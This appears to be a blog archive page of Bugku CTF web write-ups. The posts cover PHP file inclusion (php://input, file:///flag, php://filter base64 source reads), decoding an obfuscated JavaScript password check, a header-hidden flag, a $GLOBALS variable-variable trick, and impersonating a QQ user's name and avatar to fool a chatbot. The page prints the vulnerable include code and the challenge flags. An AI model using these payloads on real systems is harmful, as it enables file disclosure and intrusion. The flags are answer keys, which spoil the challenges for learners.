-    <article id="post-bugku-web-文件包含" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/31/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">bugku-web-文件包含</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/07/31/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="archive-article-date">
-  	<time datetime="2021-07-31T15:07:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>主要是利用file协议和php协议，算是内网渗透？</p>
-<p>打开后发现一个超链接</p>
-<img src="/2021/07/31/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.PNG" class="" title="1.PNG">
-<p>点击后发现url行为file=show.php</p>
-<img src="/2021/07/31/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.PNG" class="" title="2.PNG">
-<p>可能是通过file来包含并读取文件</p>
-<p>这种题有一个思路是可以用php://input的方法传入木马，然后连接的</p>
-<p>可以在url行传一个</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;114.67.246.176:15309&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;input</span><br></pre></td></tr></table></figure>
-<p>然后在post行传</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
-<p>就可以看php的配置了，然后根据配置来判断可以使用什么协议<br>这才是真正用来学习的题，不过被禁掉了，这道题的学习意义就降了不少</p>
-<p>只能盲注了，可以通过file协议，然后盲猜文件名为/flag<br>然后传值<a target="_blank" rel="noopener" href="http://114.67.246.176:15309/index.php?file=file:///flag">http://114.67.246.176:15309/index.php?file=file:///flag</a><br>得到flag<br>file:///是协议头</p>
-<img src="/2021/07/31/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.PNG" class="" title="3.PNG">
-
-<p>也可以通过php://filter的方法：php://filter/read=convert.base64-encode/resource=[文件名]，作用是读取文件源码</p>
-<p>所以传值<a target="_blank" rel="noopener" href="http://114.67.246.176:15309/index.php?file=php://filter/read=convert.base64-encode/resource=index.php">http://114.67.246.176:15309/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</a><br>得到一些base64编码的内容</p>
-<img src="/2021/07/31/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.PNG" class="" title="4.PNG">
-<p>解码后得到源代码——</p>
-<img src="/2021/07/31/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/5.PNG" class="" title="5.PNG">
-
-<p>内容如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">﻿&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-web&lt;&#x2F;title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;</span><br><span class="line">	$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">		echo &quot;Oh no!&quot;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line">	include($file); </span><br><span class="line">&#x2F;&#x2F;flag:flag&#123;92ec309be49aa3cb00a355b2074ef9b0&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<p>得到flag<br>顺便发现确实对input过滤了</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/31/bugku-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-源代码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/31/bugku-web-%E6%BA%90%E4%BB%A3%E7%A0%81/">bugku-web-源代码</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/07/31/bugku-web-%E6%BA%90%E4%BB%A3%E7%A0%81/" class="archive-article-date">
-  	<time datetime="2021-07-31T14:51:21.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开后提示“看看源代码？”<br>打开源代码后发现这个代码——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var p1 &#x3D; &#39;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74%28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29%3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70%65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62&#39;;</span><br><span class="line">var p2 &#x3D; &#39;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b&#39;;</span><br><span class="line">eval(unescape(p1) + unescape(&#39;%35%34%61%61%32&#39; + p2));</span><br></pre></td></tr></table></figure>
-
-<p>url解码后为——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var p1 &#x3D; &#39;function checkSubmit()&#123;var a&#x3D;document.getElementById(&quot;password&quot;);if(&quot;undefined&quot;!&#x3D;typeof a)&#123;if(&quot;67d709b2b&#39;;</span><br><span class="line">var p2 &#x3D; &#39;aa648cf6e87a7114f1&quot;&#x3D;&#x3D;a.value)return!0;alert(&quot;Error&quot;);a.focus();return!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit&#x3D;checkSubmit;&#39;;</span><br><span class="line">eval(unescape(p1) + unescape(&#39;54aa2&#39; + p2));</span><br></pre></td></tr></table></figure>
-<p>unescape()的作用是解码<br>拼接后就是——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">eval(</span><br><span class="line">function checkSubmit()</span><br><span class="line">&#123;</span><br><span class="line">	var a&#x3D;document.getElementById(&quot;password&quot;);</span><br><span class="line">	if(&quot;undefined&quot;!&#x3D;typeof a)</span><br><span class="line">	&#123;</span><br><span class="line">		if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;&#x3D;&#x3D;a.value)</span><br><span class="line">		return!0;</span><br><span class="line">		alert(&quot;Error&quot;);</span><br><span class="line">		a.focus();</span><br><span class="line">		return!1</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">document.getElementById(&quot;levelQuest&quot;).onsubmit&#x3D;checkSubmit;</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p>简单来说就是传值若等于67d709b2b54aa2aa648cf6e87a7114f1，就返回flag</p>
-<p>然后输进去就得到flag</p>
-<img src="/2021/07/31/bugku-web-%E6%BA%90%E4%BB%A3%E7%A0%81/1.PNG" class="" title="1.PNG">
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/31/bugku-web-%E6%BA%90%E4%BB%A3%E7%A0%81/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-社工-伪造" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0/">bugku-web-社工-伪造</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0/" class="archive-article-date">
-  	<time datetime="2021-07-31T14:17:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这道题虽然既没技术含量（玩家角度），又骗金币，不过还挺好玩的</p>
-<p>打开后让输入qq号</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0/1.PNG" class="" title="1.PNG">
-<p>放心输入就行，这个的功能就是抓取你的qq头像和昵称</p>
-<p>进去后发现一个“人”在线，因为装了最基础的ai，所以可以和她聊天</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0/2.PNG" class="" title="2.PNG">
-<p>问flag会告知只会发给“男朋友”<br>原题思路是：根据上面的qq号找到她的男朋友，换成她男朋友的头像和昵称，然后清除浏览器缓存（这步很重要），重新抓取自己的qq号（直接输那个男朋友的qq不行，不信可以试试），然后问flag就行。</p>
-<p>但是比较难受的就是，那个号主早就改名了，而这个ai认不出新名字（是的，她只认名字，为那些被坑去换头像的默哀）<br>所以现在还需要改成那个账号最早的名字“小bug”</p>
-<p>另外就是改完qq名字以后（特别是改完头像），qq自己会有一个审核过程，所以清缓存也抓取不到的不要着急。<br>如果你真的遇到当天qq在整顿，全网不允许改名那种极特殊情况，那么很遗憾，金币白花了。</p>
-<p>另外就是一个小彩蛋，输入的内容有字数限制——</p>
-<img src="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0/3.PNG" class="" title="3.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/31/bugku-web-%E7%A4%BE%E5%B7%A5-%E4%BC%AA%E9%80%A0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-头等舱" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/31/bugku-web-%E5%A4%B4%E7%AD%89%E8%88%B1/">bugku-web-头等舱</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/07/31/bugku-web-%E5%A4%B4%E7%AD%89%E8%88%B1/" class="archive-article-date">
-  	<time datetime="2021-07-31T14:13:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>头等舱=flag在header<br>没意思，开burp两分钟，得flag五秒钟</p>
-<img src="/2021/07/31/bugku-web-%E5%A4%B4%E7%AD%89%E8%88%B1/1.PNG" class="" title="1.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/31/bugku-web-%E5%A4%B4%E7%AD%89%E8%88%B1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-bugku-web-变量1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/">bugku-web-变量1</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/" class="archive-article-date">
-  	<time datetime="2021-07-31T13:58:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>打开后是php代码</p>
-<img src="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/1.PNG" class="" title="1.PNG">
-
-<p>逐行解释<br>第三行：包含flag1.php<br>第四行：接收一个args变量，若非空，则运行<br>第五行：给$args赋值（并没有用，只是为了让新手看着更直观）<br>第六行：利用正则表达式匹配，若不匹配，则程序直接die<br>第九行：输出$$args(eval没有用)</p>
-<p>关于正则表达式，网上这个解释感觉非常好——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^\w+$&#x2F; 两个&#x2F; &#x2F; 表明正则表达式的开始与结束 ^开始字符，$结束字符 \w 包含【a-z,A-Z,_,0-9】中的字符，+代表可以有一个，或多个\w </span><br><span class="line"> 总的加起来意思是 以[a-z,A-Z,_,0-9]中的其中一个字符开始，中间可以有任意个[a-z,A-Z,_,0-9]字符，最后再以[a-z,A-Z,_,0-9]中的一个字符结束 比如适合的有：a,a09,a_01,001 不适合的有a-5，@12，￥12，中文字符，这些都不在[a-z,A-Z,_,0-9]范围里面</span><br></pre></td></tr></table></figure>
-<p>相当于传入的值只能是大小写字母或数字，字符只能是“_”<br>所以不能传入别的字符，不能传shell了</p>
-<p>另外推荐一个比较好的正则表达式网站——<a target="_blank" rel="noopener" href="https://regex101.com/">https://regex101.com/</a></p>
-<p>然后就是了解到：超全局变量——<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.superglobals.php">https://www.php.net/manual/zh/language.variables.superglobals.php</a></p>
-<p>这里用到$GLOBALS</p>
-<p>所以传值?args=GLOBALS,得到flag</p>
-<img src="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/2.PNG" class="" title="2.PNG">
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/31/bugku-web-%E5%8F%98%E9%87%8F1/">展开全文 >></a>
         </p>
       
 
